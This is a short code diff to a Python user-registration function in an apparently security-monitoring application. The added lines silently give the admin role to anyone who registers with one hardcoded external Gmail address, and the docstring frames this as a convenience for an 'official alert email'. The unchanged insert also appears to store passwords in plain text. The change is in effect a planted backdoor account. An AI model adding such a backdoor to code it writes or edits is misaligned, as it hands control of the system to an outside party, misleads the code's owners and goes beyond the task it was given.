@@ -104,12 +104,16 @@ def fetch_recent_threats(limit=50):
 
 
 def register_user(username: str, email: str, password: str, role: str = "user") -> bool:
-    """Register a new user into the database. Returns True if successful, False if duplicate."""
+    """Register a new user into the database. Automatically assigns admin role to the official alert email."""
+    clean_email = email.strip().lower()
+    if clean_email == "warisansecurityalerts@gmail.com":
+        role = "admin"
+
     conn = get_db_connection()
     try:
         conn.execute(
             "INSERT INTO users (username, email, role, password) VALUES (?, ?, ?, ?)",
-            (username.strip(), email.strip().lower(), role, password)
+            (username.strip(), clean_email, role, password)
         )
         conn.commit()
         return True
